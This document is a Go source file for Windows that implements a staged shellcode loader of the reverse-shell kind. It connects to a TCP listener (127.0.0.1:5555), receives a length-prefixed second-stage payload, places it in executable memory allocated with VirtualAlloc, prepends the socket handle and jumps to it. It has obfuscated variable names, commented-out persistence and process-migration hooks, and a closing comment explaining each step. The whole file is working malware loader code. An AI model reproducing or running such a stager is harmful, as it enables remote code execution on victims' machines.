package main


import "encoding/binary"
import "syscall"
import "unsafe"
//import "EGESPLOIT/RSE"

const MEM_COMMIT  = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_AllocateUTE_READWRITE  = 0x40


var K32 = syscall.NewLazyDLL("kernel32.dll")
var VirtualAlloc = K32.NewProc("VirtualAlloc")


func Allocate(Shellcode uintptr) (uintptr) {

	Addr, _, _ := VirtualAlloc.Call(0, Shellcode, MEM_RESERVE|MEM_COMMIT, PAGE_AllocateUTE_READWRITE)
	if Addr == 0 {
		main()
	}
	return Addr
}

func main() {
	//RSE.Persistence()
	var WSA_Data syscall.WSAData
	syscall.WSAStartup(uint32(0x202), &WSA_Data)
	Socket, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	Socket_Addr := syscall.SockaddrInet4{Port: 5555, Addr: [4]byte{127,0,0,1}}
	syscall.Connect(Socket, &Socket_Addr)
	var Length [4]byte
	WSA_Buffer := syscall.WSABuf{Len: uint32(4), Buf: &Length[0]}
	UitnZero_1 := uint32(0)
	DataReceived := uint32(0)
	syscall.WSARecv(Socket, &WSA_Buffer, 1, &DataReceived, &UitnZero_1, nil, nil)
	Length_int := binary.LittleEndian.Uint32(Length[:])
	if Length_int < 100 {
		main()
	}
	Shellcode_Buffer := make([]byte, Length_int)

	var Shellcode []byte
	WSA_Buffer = syscall.WSABuf{Len: Length_int, Buf: &Shellcode_Buffer[0]}
	UitnZero_1 = uint32(0)
	DataReceived = uint32(0)
	TotalDataReceived := uint32(0)
	for TotalDataReceived < Length_int {
		syscall.WSARecv(Socket, &WSA_Buffer, 1, &DataReceived, &UitnZero_1, nil, nil)
		for i := 0; i < int(DataReceived); i++ {
			Shellcode = append(Shellcode, Shellcode_Buffer[i])
		}
		TotalDataReceived += DataReceived
	}

	Addr := Allocate(uintptr(Length_int + 5))
	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
	SocketPtr := (uintptr)(unsafe.Pointer(Socket))
	AddrPtr[0] = 0xBF
	AddrPtr[1] = byte(SocketPtr)
	AddrPtr[2] = 0x00
	AddrPtr[3] = 0x00
	AddrPtr[4] = 0x00
	for BpuAKrJxfl, IIngacMaBh := range Shellcode {
		AddrPtr[BpuAKrJxfl+5] = IIngacMaBh
	}
	//RSE.Migrate(Addr, int(Length_int))
	syscall.Syscall(Addr, 0, 0, 0, 0)
}

/*

1. Create WSA DATA version 2.2
2. Create a WSA Socket
3. Create WSA Socket Address object
4. Connect
5. Create 4 byte second stage length array
6. Create a WSA Buffer object pointing second stage length array
7. Receive 4 bytes WSARecv to second stage length array
8. Convert second stage length to int
9. Create a byte array at the size of second stage byte array for second stage shellcode
10. Create a undefined byte array
11. Create another WSA buffer object pointing at second stage shellcode byte array
12. Construct a nested for loop that receives bytes and appends them into undefined byte array
13. Allocate space in memory at the size of (second stage shellcode + 5)
14. Create a pointer that points to WSA Socket
15. Assing 0xBF(mov edi) to fist byte of allocated memory
16. Assing WSA Socket pointer to second byte of allocated memory
17. Assing tree null bytes after second byte of allocated memory
18. Move shellcode bytes to allocated memory starting at fift byte
19. Make a syscall to allocated memory address
*/
